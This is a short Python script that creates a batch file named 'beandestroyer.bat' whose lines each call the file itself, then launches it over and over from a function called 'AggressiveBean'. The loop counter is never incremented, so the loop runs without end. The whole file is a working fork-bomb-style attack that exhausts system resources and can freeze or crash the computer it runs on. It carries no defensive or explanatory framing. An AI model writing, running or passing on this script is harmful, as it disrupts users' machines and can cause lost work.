import os

if os.path.isfile("beandestroyer.bat"):
    os.remove("beandestroyer.bat")
startcmd_batchfile = open("beandestroyer.bat", "a+")
print(startcmd_batchfile.read())
startcmd_batchfile.write("")    
startcmd_batchfile.close()

if os.path.isfile("beandestroyer.bat"):
    os.remove("beandestroyer.bat")
beandestroyer = open("beandestroyer.bat", "a+")
print(beandestroyer.read())
beandestroyer.write("beandestroyer.bat\n")
beandestroyer.write("beandestroyer.bat\n")
beandestroyer.write("beandestroyer.bat\n")
beandestroyer.write("beandestroyer.bat\n")
beandestroyer.write("beandestroyer.bat\n")    
beandestroyer.close()

def AggressiveBean(run):
    M = 0
    while M < run:
        M + 1
        os.system('beandestroyer.bat')
        os.system('beandestroyer.bat')
        os.system('beandestroyer.bat')
        os.system('beandestroyer.bat')
        os.system('beandestroyer.bat')
AggressiveBean(1)
